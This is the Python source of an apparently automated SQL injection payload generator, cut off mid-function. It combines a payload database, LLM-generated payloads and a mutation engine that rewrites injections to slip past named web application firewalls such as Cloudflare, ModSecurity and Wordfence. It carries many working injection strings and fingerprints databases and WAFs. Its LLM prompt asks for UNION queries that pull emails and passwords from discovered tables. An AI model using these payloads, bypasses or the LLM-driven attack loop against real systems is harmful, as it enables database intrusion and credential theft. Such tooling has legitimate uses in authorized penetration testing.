"""
SQL Injection Hybrid Payload Generator

Combines curated SQLi payloads with LLM strategic generation and mutation engine.

Strategy:
1. Phase 1 (Database 60%): Systematically try proven SQLi payloads
2. Phase 2 (LLM 20%): Generate context-aware payloads based on learned patterns
3. Phase 3 (Mutation 20%): Mutate payloads based on detected WAF/filters

Context Detection:
- LIKE context: message LIKE '%input%'
- WHERE context: id = 'input'
- INSERT context: INSERT INTO table VALUES ('input')
- UPDATE context: UPDATE table SET col='input'
"""

from typing import List, Dict, Any, Optional, Set
import logging
import json
import random
import re
import sys
from pathlib import Path

# Import IntelligentAgent for memory and reasoning integration
sys.path.insert(0, str(Path(__file__).parent.parent.parent.parent))
from utils.intelligent_agent import IntelligentAgent


class SQLiContextDetector:
    """
    Detects SQL query context from error messages and responses.

    Helps generate context-appropriate payloads.
    """

    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)

    def detect_context(self, error_message: str, payload: str) -> str:
        """
        Detect SQL context from error message.

        Args:
            error_message: SQL error message
            payload: Payload that triggered the error

        Returns:
            Context string: "LIKE", "WHERE", "INSERT", "UPDATE", "UNKNOWN"
        """
        error_lower = error_message.lower()

        # LIKE context detection
        if 'like' in error_lower:
            if '%' in error_lower:
                self.logger.info("Detected LIKE context with wildcards")
                return "LIKE"

        # INSERT context
        if 'insert' in error_lower and 'values' in error_lower:
            self.logger.info("Detected INSERT context")
            return "INSERT"

        # UPDATE context
        if 'update' in error_lower and 'set' in error_lower:
            self.logger.info("Detected UPDATE context")
            return "UPDATE"

        # WHERE context (default for most queries)
        if 'where' in error_lower or 'select' in error_lower:
            self.logger.info("Detected WHERE context")
            return "WHERE"

        # Check for unterminated string - suggests quote context
        if 'unterminated' in error_lower or 'unclosed' in error_lower:
            if 'like' in error_lower or '%' in error_lower:
                return "LIKE"
            return "WHERE"

        return "UNKNOWN"

    def extract_query_fragment(self, error_message: str) -> Optional[str]:
        """
        Extract SQL query fragment from error message.

        Returns:
            Query fragment if found, None otherwise
        """
        # PostgreSQL style: "... in SQL select message from ..."
        patterns = [
            r"in SQL (.*?)[\.\n]",
            r"SQL syntax.*?(SELECT.*?)[\.\n]",
            r"Query was: (.*?)[\.\n]",
            r"near \"(.*?)\"",
        ]

        for pattern in patterns:
            match = re.search(pattern, error_message, re.IGNORECASE | re.DOTALL)
            if match:
                fragment = match.group(1).strip()
                self.logger.info(f"Extracted query fragment: {fragment[:100]}...")
                return fragment

        return None


class SQLiMutationEngine:
    """
    Mutates SQLi payloads based on learned WAF/filter patterns.

    Applies intelligent mutations to bypass specific filters.
    """

    def __init__(self):
        self.logger = logging.getLogger(self.__class__.__name__)

    def mutate_for_context(
        self,
        payload: str,
        context: str,
        blocked_patterns: List[str]
    ) -> List[str]:
        """
        Generate context-aware mutations.

        Args:
            payload: Original payload
            context: SQL context (LIKE, WHERE, etc.)
            blocked_patterns: Detected blocked patterns

        Returns:
            List of mutated payloads
        """
        mutations = []

        # Apply context-specific mutations
        if context == "LIKE":
            mutations.extend(self._mutate_like_context(payload))
        elif context == "WHERE":
            mutations.extend(self._mutate_where_context(payload))
        elif context == "INSERT":
            mutations.extend(self._mutate_insert_context(payload))

        # Apply WAF bypass mutations
        mutations.extend(self._apply_waf_bypass(payload, blocked_patterns))

        # Remove duplicates
        mutations = list(set(mutations))

        self.logger.debug(f"Generated {len(mutations)} mutations for {context} context")
        return mutations[:15]  # Limit to top 15

    def _mutate_like_context(self, payload: str) -> List[str]:
        """Mutations for LIKE '%input%' context"""
        mutations = []

        # If payload doesn't start with %, add it
        if not payload.startswith('%'):
            mutations.append('%' + payload)

        # Close LIKE pattern variations
        base_patterns = [
            "%' OR '1'='1",
            "%' OR 1=1--",
            "%' OR 1=1#",
            "' OR '1'='1' OR '%'='",
            "' OR 1=1 OR '%'='",
            "%' UNION SELECT NULL--",
            "%' AND SLEEP(5)--",
            "%' AND pg_sleep(5)--",
        ]

        # Add variations of current payload
        if "'" in payload:
            # Try different comment styles
            mutations.append(payload + "--")
            mutations.append(payload + " --")
            mutations.append(payload + "#")
            mutations.append(payload + "/*")

            # Try closing with OR '%'='
            mutations.append(payload + " OR '%'='")
            mutations.append(payload + " AND '%'='")

        mutations.extend(base_patterns)
        return mutations

    def _mutate_where_context(self, payload: str) -> List[str]:
        """Mutations for WHERE context"""
        mutations = []

        # Standard WHERE bypasses
        if "'" in payload or '"' in payload:
            # Comment variations
            mutations.append(payload + "--")
            mutations.append(payload + " --")
            mutations.append(payload + "#")
            mutations.append(payload + "-- -")

            # NULL byte
            mutations.append(payload + "%00")

            # Parenthesis variations
            if "OR" in payload.upper():
                mutations.append(payload.replace("OR", ") OR ("))
                mutations.append(payload.replace("'", "')").replace("OR", "OR ('"))

        return mutations

    def _mutate_insert_context(self, payload: str) -> List[str]:
        """Mutations for INSERT context"""
        mutations = []

        # INSERT-specific bypasses
        mutations.append("', (SELECT version()))--")
        mutations.append("', 'hacked')--")
        mutations.append("');--")

        return mutations

    def _apply_waf_bypass(self, payload: str, blocked_patterns: List[str]) -> List[str]:
        """Apply WAF bypass mutations"""
        mutations = []

        if not blocked_patterns:
            return self._general_waf_bypass(payload)

        for pattern in blocked_patterns:
            pattern_lower = pattern.lower()

            # UNION blocking
            if 'union' in pattern_lower:
                mutations.extend(self._bypass_union_filter(payload))

            # OR blocking
            if 'or' in pattern_lower and len(pattern) <= 3:
                mutations.extend(self._bypass_or_filter(payload))

            # Comment blocking
            if '--' in pattern or '#' in pattern:
                mutations.extend(self._bypass_comment_filter(payload))

            # Space blocking
            if ' ' in pattern or 'space' in pattern_lower:
                mutations.extend(self._bypass_space_filter(payload))

        return mutations

    def _general_waf_bypass(self, payload: str) -> List[str]:
        """General WAF bypass techniques"""
        mutations = []

        # Case variation
        if payload.upper() != payload:
            mutations.append(self._case_variation(payload))

        # Space alternatives
        mutations.append(payload.replace(' ', '/**/'))
        mutations.append(payload.replace(' ', '%09'))
        mutations.append(payload.replace(' ', '%0a'))

        # Comment insertion
        if 'SELECT' in payload.upper():
            mutations.append(payload.replace('SELECT', 'SEL/**/ECT'))
        if 'UNION' in payload.upper():
            mutations.append(payload.replace('UNION', 'UNI/**/ON'))
        if 'OR' in payload.upper():
            mutations.append(payload.replace('OR', '||'))

        return mutations

    def _bypass_union_filter(self, payload: str) -> List[str]:
        """Bypass UNION keyword filter"""
        mutations = []

        if 'UNION' in payload.upper():
            mutations.append(payload.replace('UNION', 'UNI/**/ON'))
            mutations.append(payload.replace('UNION', 'UN%0aION'))
            mutations.append(payload.replace('UNION', '/*!50000UNION*/'))
            mutations.append(payload.replace('UNION', 'UnIoN'))

        return mutations

    def _bypass_or_filter(self, payload: str) -> List[str]:
        """Bypass OR keyword filter"""
        mutations = []

        if 'OR' in payload.upper():
            mutations.append(payload.replace('OR', '||'))
            mutations.append(payload.replace(' OR ', ' %09OR%09 '))
            mutations.append(payload.replace(' OR ', '/**/OR/**/'))
            mutations.append(payload.replace('OR', 'oR'))

        return mutations

    def _bypass_comment_filter(self, payload: str) -> List[str]:
        """Bypass comment filter"""
        mutations = []

        # Replace -- with alternatives
        if '--' in payload:
            mutations.append(payload.replace('--', '#'))
            mutations.append(payload.replace('--', '-- -'))
            mutations.append(payload.replace('--', ';%00'))

        # Replace # with alternatives
        if '#' in payload:
            mutations.append(payload.replace('#', '--'))
            mutations.append(payload.replace('#', '-- -'))

        return mutations

    def _bypass_space_filter(self, payload: str) -> List[str]:
        """Bypass space filter"""
        mutations = []

        if ' ' in payload:
            mutations.append(payload.replace(' ', '/**/'))
            mutations.append(payload.replace(' ', '%09'))
            mutations.append(payload.replace(' ', '%0a'))
            mutations.append(payload.replace(' ', '+'))
            mutations.append(payload.replace(' ', '%0d'))

        return mutations

    def _case_variation(self, text: str) -> str:
        """Create alternating case variation"""
        result = []
        for i, char in enumerate(text):
            if i % 2 == 0:
                result.append(char.upper())
            else:
                result.append(char.lower())
        return ''.join(result)


class SQLiHybridGenerator(IntelligentAgent):
    """
    Hybrid SQLi payload generator with database, LLM, and mutation phases.
    Now integrates memory and reasoning transparency like XSS detection!

    Generation Phases:
    1. Database Phase (60%): Systematic testing of proven payloads
    2. LLM Phase (20%): Strategic generation based on analysis
    3. Mutation Phase (20%): Context-aware mutations

    Intelligent Features:
    - Memory: Remembers successful/failed payloads across scans
    - Reasoning: Transparent chain-of-thought logging
    - Adaptive: Learns from responses and adjusts strategy
    """

    PHASE_DATABASE = "database"
    PHASE_LLM = "llm"
    PHASE_MUTATION = "mutation"

    def __init__(
        self,
        llm_client,
        database_path: Optional[str] = None,
        memory_manager=None,
        reasoning_tracker=None,
        reasoning_session_id=None,
        sast_profile=None
    ):
        """
        Initialize hybrid SQLi generator with intelligence.

        Args:
            llm_client: AWS Bedrock LLM client
            database_path: Path to payloads_db.json
            memory_manager: Memory system for learning across scans
            reasoning_tracker: Reasoning transparency tracker
            reasoning_session_id: Session ID for reasoning logging
            sast_profile: SAST intelligence profile (optional, can be set later)
        """
        # Initialize IntelligentAgent base class (for memory and reasoning)
        super().__init__(memory_manager, reasoning_tracker, reasoning_session_id)

        self.llm = llm_client
        self.logger = logging.getLogger(self.__class__.__name__)
        self.sast_profile = sast_profile  # SAST intelligence profile

        # Load payload database
        if database_path is None:
            database_path = Path(__file__).parent / 'payloads_db.json'

        self.database = self._load_database(database_path)
        self.context_detector = SQLiContextDetector()
        self.mutation_engine = SQLiMutationEngine()

        # Tracking state
        self.tried_payloads: Set[str] = set()
        self.attempt_history: List[Dict] = []
        self.detected_context: str = "UNKNOWN"
        self.detected_filters: List[str] = []

        # Generation state
        self.current_phase = self.PHASE_DATABASE
        self.current_technique_idx = 0
        self.current_payload_idx = 0
        self.techniques_list = list(self.database['techniques'].keys())

        # Prioritize LIKE context at start
        if 'like_context_injection' in self.techniques_list:
            self.techniques_list.remove('like_context_injection')
            self.techniques_list.insert(0, 'like_context_injection')

        self.logger.info(f"Initialized SQLi hybrid generator with {len(self.techniques_list)} techniques")

        # Announce memory/reasoning status
        if self.memory:
            self.logger.info("   Memory enabled: Learning from past SQLi tests")
        if self.reasoning:
            self.logger.info("   Reasoning transparency enabled")

    def set_sast_profile(self, sast_profile):
        """
        Set SAST intelligence profile after initialization

        Args:
            sast_profile: SASTProfile with discovered intelligence
        """
        self.sast_profile = sast_profile
        self.logger.info("[SAST] Intelligence profile loaded into generator")

        if sast_profile and sast_profile.database_type:
            self.logger.info(f"[SAST] Will prioritize {sast_profile.database_type.upper()}-specific payloads")

        if sast_profile and sast_profile.waf_detected:
            self.logger.info(f"[SAST] Will apply {sast_profile.waf_detected.upper()} WAF bypasses")

        if sast_profile and sast_profile.table_names:
            self.logger.info(f"[SAST] Will target {len(sast_profile.table_names)} discovered tables")

    def _load_database(self, path: Path) -> Dict[str, Any]:
        """Load payload database"""
        try:
            with open(path, 'r') as f:
                db = json.load(f)
            self.logger.info(f"Loaded SQLi payload database v{db['metadata']['version']} "
                           f"with {db['metadata']['total_payloads']} payloads")
            return db
        except Exception as e:
            self.logger.error(f"Failed to load payload database: {e}")
            return {
                'metadata': {'version': '0.0.0'},
                'techniques': {
                    'basic': {'payloads': ["'", "' OR '1'='1"]}
                }
            }

    def analyze_response(
        self,
        payload: str,
        response_html: str,
        response_time: float,
        error_message: str = ""
    ) -> Dict[str, Any]:
        """
        Deep response analysis - learns from what server did to payload
        Similar to XSS _test_dom_vector_with_analysis

        Args:
            payload: Tested payload
            response_html: HTML response body
            response_time: Response time in seconds
            error_message: SQL error message if any

        Returns:
            Analysis dict with transformation, encoding, filtering info
        """
        analysis = {
            'payload_sent': payload,
            'payload_found_in_response': False,
            'transformation': None,
            'blocked_chars': [],
            'encoding_detected': [],
            'filtering_detected': [],
            'context': 'UNKNOWN',
            'database_fingerprint': None,
            'waf_signature': None,
            'response_time': response_time,
            'summary': ''
        }

        # Check if payload exists in response
        if payload in response_html:
            analysis['payload_found_in_response'] = True
            analysis['transformation'] = 'unchanged'
        else:
            # Check for transformations
            import html as html_module
            from urllib.parse import quote

            # HTML encoding check
            html_encoded = html_module.escape(payload)
            if html_encoded in response_html:
                analysis['payload_found_in_response'] = True
                analysis['transformation'] = 'html_encoded'
                analysis['encoding_detected'].append('HTML entities')
                analysis['summary'] = f"Payload was HTML-encoded: {payload[:30]}... → {html_encoded[:30]}..."

            # URL encoding check
            url_encoded = quote(payload)
            if url_encoded in response_html:
                analysis['payload_found_in_response'] = True
                analysis['transformation'] = 'url_encoded'
                analysis['encoding_detected'].append('URL encoding')
                analysis['summary'] = f"Payload was URL-encoded"

            # Check for SQL escaping
            escaped_patterns = [
                (payload.replace("'", "\\'"), 'backslash_escape'),
                (payload.replace("'", "''"), 'sql_double_quote'),
                (payload.replace('"', '\\"'), 'double_quote_escape'),
            ]

            for escaped, escape_type in escaped_patterns:
                if escaped in response_html:
                    analysis['payload_found_in_response'] = True
                    analysis['transformation'] = escape_type
                    analysis['encoding_detected'].append(escape_type)
                    analysis['summary'] = f"Payload was escaped using {escape_type}"
                    break

            # Check if dangerous chars were stripped
            dangerous_sql_chars = ["'", '"', '--', '#', ';', 'OR', 'AND', 'UNION', 'SELECT']
            found_chars = [char for char in dangerous_sql_chars if char.lower() in payload.lower()]

            if found_chars and not analysis['payload_found_in_response']:
                chars_in_response = [char for char in found_chars if char in response_html]
                if not chars_in_response:
                    analysis['filtering_detected'].append('SQL keywords/chars stripped')
                    analysis['blocked_chars'] = found_chars
                    analysis['summary'] = f"SQL characters removed: {', '.join(found_chars)}"

        # Detect context from error message
        if error_message:
            context = self.context_detector.detect_context(error_message, payload)
            analysis['context'] = context

            # Database fingerprinting
            db_signatures = {
                'mysql': ['mysql', 'mariadb', 'you have an error in your sql syntax'],
                'postgresql': ['postgresql', 'psql', 'syntax error at or near'],
                'mssql': ['microsoft sql', 'mssql', 'incorrect syntax near'],
                'oracle': ['oracle', 'ora-', 'pl/sql'],
                'sqlite': ['sqlite', 'near', 'syntax error']
            }

            error_lower = error_message.lower()
            for db_name, signatures in db_signatures.items():
                if any(sig in error_lower for sig in signatures):
                    analysis['database_fingerprint'] = db_name
                    self.logger.info(f"[FINGERPRINT] Detected database: {db_name.upper()}")
                    break

        # WAF signature detection
        waf_signatures = {
            'cloudflare': ['cloudflare', 'cf-ray', 'attention required'],
            'modsecurity': ['modsecurity', 'mod_security'],
            'wordfence': ['wordfence', 'generated by wordfence'],
            'imperva': ['imperva', 'incapsula'],
            'f5': ['f5', 'bigip'],
            'akamai': ['akamai', 'reference #']
        }

        response_lower = response_html.lower()
        for waf_name, signatures in waf_signatures.items():
            if any(sig in response_lower for sig in signatures):
                analysis['waf_signature'] = waf_name
                self.logger.warning(f"[WAF] Detected WAF: {waf_name.upper()}")
                break

        # Set summary if not already set
        if not analysis['summary']:
            if not analysis['payload_found_in_response']:
                analysis['summary'] = "Payload not found in response - may be blocked or redirected"
            else:
                analysis['summary'] = f"Payload found with transformation: {analysis['transformation']}"

        return analysis

    def update_from_response(
        self,
        payload: str,
        vulnerable: bool,
        error_message: str = "",
        confidence: int = 0,
        response_analysis: Optional[Dict] = None
    ):
        """
        Update generator state based on verification result with response analysis.

        Args:
            payload: Tested payload
            vulnerable: Whether payload was successful
            error_message: SQL error message (if any)
            confidence: Detection confidence
            response_analysis: Deep response analysis dict (optional)
        """
        # Track attempt with response analysis
        attempt_data = {
            'payload': payload,
            'vulnerable': vulnerable,
            'error_message': error_message,
            'confidence': confidence
        }

        if response_analysis:
            attempt_data['response_analysis'] = response_analysis

            # Learn from response analysis
            if response_analysis.get('blocked_chars'):
                for char in response_analysis['blocked_chars']:
                    if char not in self.detected_filters:
                        self.detected_filters.append(char)
                        self.logger.info(f"[FILTER DETECTED] {char} is being blocked/stripped")

            if response_analysis.get('waf_signature'):
                waf = response_analysis['waf_signature']
                if waf not in self.detected_filters:
                    self.detected_filters.append(f"WAF_{waf}")
                    self.logger.warning(f"[WAF DETECTED] {waf.upper()} WAF is active")

            if response_analysis.get('database_fingerprint'):
                # Could use this to prioritize database-specific payloads
                pass

        self.attempt_history.append(attempt_data)

        # Detect context from error message
        if error_message and self.detected_context == "UNKNOWN":
            context = self.context_detector.detect_context(error_message, payload)
            if context != "UNKNOWN":
                self.detected_context = context
                self.logger.info(f"Detected SQL context: {context}")

                # Extract query fragment for more insights
                fragment = self.context_detector.extract_query_fragment(error_message)
                if fragment:
                    self.logger.info(f"Query fragment: {fragment[:100]}")

    def generate_next_payload(
        self,
        attempt_number: int,
        max_attempts: int = 30
    ) -> Dict[str, Any]:
        """
        Generate next payload using hybrid strategy.

        Args:
            attempt_number: Current attempt number
            max_attempts: Maximum attempts allowed

        Returns:
            Dict with payload and metadata
        """
        self.logger.info(f"Generating payload #{attempt_number} (phase: {self.current_phase})")

        # Update phase based on progress
        self._update_phase(attempt_number, max_attempts)

        # Generate based on phase
        if self.current_phase == self.PHASE_DATABASE:
            return self._generate_from_database(attempt_number)

        elif self.current_phase == self.PHASE_MUTATION:
            return self._generate_mutation(attempt_number)

        else:  # PHASE_LLM
            return self._generate_with_llm(attempt_number)

    def _update_phase(self, attempt_number: int, max_attempts: int):
        """Update generation phase based on progress"""
        database_attempts = int(max_attempts * 0.6)
        llm_end = int(max_attempts * 0.8)

        if attempt_number <= database_attempts:
            self.current_phase = self.PHASE_DATABASE
        elif attempt_number <= llm_end:
            self.current_phase = self.PHASE_LLM
        else:
            self.current_phase = self.PHASE_MUTATION

    def _generate_from_database(self, attempt_number: int) -> Dict[str, Any]:
        """Generate payload from database with memory integration"""

        # Log action with reasoning
        if self.reasoning:
            self._log_action(
                f"Generating database payload #{attempt_number}",
                technique=self.techniques_list[self.current_technique_idx] if self.current_technique_idx < len(self.techniques_list) else 'exhausted',
                phase='database'
            )

        # Prioritize context-specific payloads if context is known
        if self.detected_context == "LIKE":
            if self.current_technique_idx == 0:
                # Start with LIKE payloads
                technique_name = 'like_context_injection'
                if technique_name in self.database['techniques']:
                    technique_data = self.database['techniques'][technique_name]
                    payloads = technique_data.get('payloads', [])

                    if self.current_payload_idx < len(payloads):
                        payload = payloads[self.current_payload_idx]
                        self.current_payload_idx += 1

                        # SAST Intelligence: Apply WAF bypasses if WAF detected
                        if self.sast_profile and self.sast_profile.waf_detected:
                            waf = self.sast_profile.waf_detected.lower()
                            original_payload = payload

                            # Apply WAF-specific mutations for LIKE context
                            if waf == 'cloudflare':
                                payload = payload.replace(' OR ', '/**/OR/**/')
                            elif waf == 'modsecurity':
                                payload = payload.replace(' OR ', ' %09OR%09 ')
                            elif waf == 'wordfence':
                                payload = payload.replace(' OR ', ' || ')
                            else:
                                payload = payload.replace(' ', '/**/')

                            if payload != original_payload:
                                self.logger.debug(f"[WAF BYPASS] Applied {waf} bypass to LIKE payload")

                        # Check memory before trying
                        if self.memory:
                            should_test, reason = self.should_test_payload(payload, "sqli")
                            if not should_test:
                                self.logger.info(f"⏭️ Skipping payload (memory): {reason}")
                                return self._generate_from_database(attempt_number)

                        if payload not in self.tried_payloads:
                            self.tried_payloads.add(payload)
                            return {
                                'payload': payload,
                                'technique': technique_name,
                                'phase': 'database',
                                'context': 'LIKE',
                                'attempt_number': attempt_number
                            }

        # Standard systematic iteration
        if self.current_technique_idx >= len(self.techniques_list):
            self.logger.info("Database exhausted, switching to LLM")
            self.current_phase = self.PHASE_LLM
            return self._generate_fallback(attempt_number)

        technique_name = self.techniques_list[self.current_technique_idx]
        technique_data = self.database['techniques'][technique_name]
        payloads = technique_data.get('payloads', [])

        # SAST Intelligence: Skip payloads for wrong database type
        if self.sast_profile and self.sast_profile.database_type:
            technique_db = technique_data.get('database', 'generic')

            # If this technique is database-specific and doesn't match detected database, skip it
            if technique_db not in ['generic', self.sast_profile.database_type]:
                self.logger.debug(f"[SAST] Skipping {technique_db} technique (detected: {self.sast_profile.database_type})")
                # Move to next technique
                self.current_technique_idx += 1
                self.current_payload_idx = 0
                return self._generate_from_database(attempt_number)

        if self.current_payload_idx >= len(payloads):
            # Move to next technique
            self.current_technique_idx += 1
            self.current_payload_idx = 0
            return self._generate_from_database(attempt_number)

        payload = payloads[self.current_payload_idx]
        self.current_payload_idx += 1

        # SAST Intelligence: Apply WAF bypasses if WAF detected
        if self.sast_profile and self.sast_profile.waf_detected:
            waf = self.sast_profile.waf_detected.lower()
            original_payload = payload

            # Apply WAF-specific mutations
            if waf == 'cloudflare':
                # Cloudflare bypasses: comment insertion, URL encoding
                payload = payload.replace(' OR ', '/**/OR/**/')
                payload = payload.replace('UNION', 'UNI/**/ON')
            elif waf == 'modsecurity':
                # ModSecurity bypasses: case variation, hex encoding
                payload = payload.replace('UNION', 'UnIoN')
                payload = payload.replace(' OR ', ' %09OR%09 ')
            elif waf == 'wordfence':
                # Wordfence bypasses: encoding, alternative operators
                payload = payload.replace(' OR ', ' || ')
                payload = payload.replace('--', '#')
            else:
                # Generic WAF bypasses
                payload = payload.replace(' ', '/**/')

            if payload != original_payload:
                self.logger.debug(f"[WAF BYPASS] Applied {waf} bypass: {original_payload[:40]} → {payload[:40]}")

        # Check memory before trying
        if self.memory:
            should_test, reason = self.should_test_payload(payload, "sqli")
            if not should_test:
                self.logger.info(f"⏭️ Skipping payload (memory): {reason}")
                return self._generate_from_database(attempt_number)

        if payload in self.tried_payloads:
            return self._generate_from_database(attempt_number)

        self.tried_payloads.add(payload)

        return {
            'payload': payload,
            'technique': technique_name,
            'phase': 'database',
            'context': self.detected_context,
            'attempt_number': attempt_number
        }

    def _generate_mutation(self, attempt_number: int) -> Dict[str, Any]:
        """Generate mutated payload"""
        self.logger.info(f"Mutation phase: context={self.detected_context}")

        # Pick a base payload from recent attempts
        base_payload = "' OR '1'='1"
        if self.attempt_history:
            # Use a recent payload that showed some promise
            recent = [a for a in self.attempt_history[-10:] if a['confidence'] > 0]
            if recent:
                base_payload = recent[-1]['payload']

        # Generate mutations
        mutations = self.mutation_engine.mutate_for_context(
            base_payload,
            self.detected_context,
            self.detected_filters
        )

        # Find first untried mutation
        for mutation in mutations:
            if mutation not in self.tried_payloads:
                self.tried_payloads.add(mutation)
                return {
                    'payload': mutation,
                    'technique': 'mutation',
                    'phase': 'mutation',
                    'context': self.detected_context,
                    'base_payload': base_payload,
                    'attempt_number': attempt_number
                }

        # Fallback
        return self._generate_fallback(attempt_number)

    def _generate_with_llm(self, attempt_number: int) -> Dict[str, Any]:
        """Generate strategic payload with LLM"""
        self.logger.info("LLM strategic generation")

        # Build context for LLM
        recent_attempts = self.attempt_history[-10:]
        recent_str = "\n".join([
            f"- Payload: {a['payload'][:50]}... | Vulnerable: {a['vulnerable']} | Confidence: {a['confidence']}%"
            for a in recent_attempts
        ])

        successful = [a for a in self.attempt_history if a['vulnerable']]
        successful_str = "\n".join([
            f"- {a['payload'][:70]}... (confidence: {a['confidence']}%)"
            for a in successful[-3:]
        ]) if successful else "None yet"

        # SAST Intelligence: Add discovered tables/columns for targeted UNION queries
        sast_intel = ""
        if self.sast_profile:
            if self.sast_profile.table_names:
                tables = ', '.join(list(self.sast_profile.table_names)[:5])
                sast_intel += f"\n\nSAST INTELLIGENCE - DISCOVERED TABLES:\n{tables}"
                sast_intel += "\n(Use these in UNION queries for targeted data extraction!)"

            if self.sast_profile.column_names:
                columns = ', '.join(list(self.sast_profile.column_names)[:8])
                sast_intel += f"\n\nDISCOVERED COLUMNS:\n{columns}"
                sast_intel += "\n(Target these columns in your UNION SELECT!)"

            if self.sast_profile.waf_detected:
                sast_intel += f"\n\nWAF DETECTED: {self.sast_profile.waf_detected.upper()}"
                sast_intel += "\n(Apply WAF-specific bypasses!)"

        prompt = f"""
Generate the NEXT strategic SQL injection payload.

ATTEMPT: #{attempt_number}
DETECTED CONTEXT: {self.detected_context}
TOTAL ATTEMPTS SO FAR: {len(self.attempt_history)}

RECENT ATTEMPTS:
{recent_str}

SUCCESSFUL PAYLOADS:
{successful_str}

DETECTED FILTERS:
{', '.join(self.detected_filters) if self.detected_filters else 'None detected'}
{sast_intel}

INSTRUCTIONS:
1. Analyze the detected SQL context ({self.detected_context})
2. Look at patterns in successful/failed attempts
3. Generate ONE highly targeted SQLi payload
4. Consider context-specific techniques:
   - LIKE context: Close the LIKE pattern first (e.g., %' OR 1=1--)
   - WHERE context: Standard injection (e.g., ' OR '1'='1)
   - Use advanced bypasses if filters detected
5. **CRITICAL**: If tables/columns discovered, use them in UNION queries!
   Example: ' UNION SELECT email, password FROM users--

Respond ONLY with JSON:
{{
  "payload": "exact SQLi payload string",
  "technique": "technique name",
  "reasoning": "why this should work for {self.detected_context} context",
  "confidence": 0-100,
  "alternatives": ["alt1", "alt2"]
}}
"""

        try:
            from ...xss_agent.llm_client import get_default_model
            response = self.llm.simple_chat(
                model=get_default_model(),
                message=prompt,
                temperature=0.9
            )

            data = self._parse_json_response(response)
            payload = data.get('payload', "' OR '1'='1")

            self.tried_payloads.add(payload)

            return {
                'payload': payload,
                'technique': data.get('technique', 'llm_generated'),
                'phase': 'llm',
                'context': self.detected_context,
                'reasoning': data.get('reasoning', ''),
                'confidence_estimate': data.get('confidence', 70),
                'attempt_number': attempt_number
            }

        except Exception as e:
            self.logger.error(f"LLM generation failed: {e}")
            return self._generate_fallback(attempt_number)

    def _parse_json_response(self, response: str) -> Dict[str, Any]:
        """Parse JSON from LLM response"""
        if '{' in response:
            json_start = response.find('{')
            brace_count = 0
            in_string = False

            for i in range(json_start, len(response)):
                char = response[i]

                if char == '"' and (i == 0 or response[i-1] != '\\'):
                    in_string = not in_string

                if not in_string:
                    if char == '{':
                        brace_count += 1
                    elif char == '}':
                        brace_count -= 1
                        if brace_count == 0:
                            json_str = response[json_start:i+1]
                            return json.loads(json_str)

        raise ValueError("Could not extract JSON from response")

    def _generate_fallback(self, attempt_number: int) -> Dict[str, Any]:
        """Fallback generation"""
        # Context-aware fallback
        if self.detected_context == "LIKE":
            payload = "%' OR 1=1--"
        else:
            payload = "' OR '1'='1"

        return {
            'payload': payload,
            'technique': 'fallback',
            'phase': 'fallback',
            'context': self.detected_context,
            'attempt_number': attempt_number
        }

    async def iterative_refinement(
        self,
        target_url: str,
        injection_point: str,
        parameter_location: str,
        failed_payloads: List[Dict],
        test_callback,
        max_iterations: int = 5
    ) -> Optional[Dict]:
        """
        Iterative LLM refinement with response learning - like XSS detection

        Uses adaptive testing: analyzes actual responses to understand protections
        and generates increasingly sophisticated bypass attempts.

        Args:
            target_url: Target URL
            injection_point: Parameter name
            parameter_location: 'query', 'post', 'cookie', etc.
            failed_payloads: List of payloads that didn't work
            test_callback: Async function to test payloads, returns (vulnerable, response_analysis)
            max_iterations: Max refinement iterations

        Returns:
            Success dict with payload info, or None if all failed
        """
        self.logger.info(f"[ITERATIVE REFINEMENT] Starting adaptive SQLi payload generation...")
        self.logger.info(f"   Max iterations: {max_iterations}")
        self.logger.info(f"   Failed attempts so far: {len(failed_payloads)}")

        adaptive_history = []

        for iteration in range(max_iterations):
            self.logger.info(f"[ITERATION {iteration + 1}/{max_iterations}] Analyzing failures and generating adaptive payloads...")

            # Build adaptive prompt with response analysis
            prompt = self._build_adaptive_sqli_prompt(
                target_url,
                injection_point,
                failed_payloads,
                adaptive_history,
                iteration
            )

            try:
                # Get LLM analysis and new payloads
                response = self.llm.simple_chat(
                    model="claude-4-sonnet",
                    message=prompt,
                    temperature=0.9  # High temp for creative bypasses
                )

                if not response or not response.strip():
                    self.logger.error(f"Empty response from LLM in iteration {iteration + 1}")
                    continue

                # Parse response (expecting JSON array of payloads)
                cleaned = self._clean_json_array_response(response)

                if not cleaned or cleaned == "[]":
                    self.logger.error(f"Failed to extract JSON from LLM response")
                    continue

                try:
                    refined_payloads = json.loads(cleaned)
                except json.JSONDecodeError as e:
                    self.logger.error(f"JSON decode error: {e}")
                    continue

                if not isinstance(refined_payloads, list):
                    self.logger.error(f"Expected list of payloads, got {type(refined_payloads)}")
                    continue

                self.logger.info(f"[LLM] Generated {len(refined_payloads)} adaptive payloads")

                # Test each refined payload with response analysis
                for payload_data in refined_payloads:
                    payload = payload_data.get('payload', '')
                    if not payload or payload in self.tried_payloads:
                        continue

                    self.tried_payloads.add(payload)
                    self.logger.info(f"[TESTING] {payload[:80]}...")

                    # Test with callback and get response analysis
                    vulnerable, response_analysis = await test_callback(
                        payload,
                        injection_point,
                        parameter_location
                    )

                    if vulnerable:
                        self.logger.info(f"[✓✓✓] SUCCESS! Iterative refinement found working payload")
                        return {
                            'payload': payload,
                            'technique': 'iterative_llm',
                            'iteration': iteration + 1,
                            'reasoning': payload_data.get('reasoning', ''),
                            'bypass_technique': payload_data.get('bypass_technique', '')
                        }
                    else:
                        # Record failure WITH response analysis for learning
                        adaptive_history.append({
                            'iteration': iteration + 1,
                            'payload': payload,
                            'reasoning': payload_data.get('reasoning'),
                            'bypass_technique': payload_data.get('bypass_technique'),
                            'result': 'failed',
                            'response_analysis': response_analysis
                        })
                        self.logger.debug(f"[✗] Failed: {response_analysis.get('summary', 'N/A')}")

                self.logger.info(f"[ITERATION {iteration + 1}] Complete - no success yet")

            except Exception as e:
                self.logger.error(f"Error in refinement iteration {iteration + 1}: {e}")
                continue

        self.logger.info(f"[ITERATIVE REFINEMENT] Completed {max_iterations} iterations without success")
        return None

    def _build_adaptive_sqli_prompt(
        self,
        target_url: str,
        injection_point: str,
        failed_payloads: List[Dict],
        adaptive_history: List[Dict],
        iteration: int
    ) -> str:
        """Build adaptive refinement prompt that learns from responses"""

        # Extract learnings from response analysis
        learnings = []
        for entry in adaptive_history[-10:]:  # Last 10 attempts
            if 'response_analysis' in entry:
                ra = entry['response_analysis']
                learnings.append({
                    'payload': entry['payload'],
                    'what_happened': ra['summary'],
                    'transformation': ra.get('transformation'),
                    'blocked_chars': ra.get('blocked_chars', []),
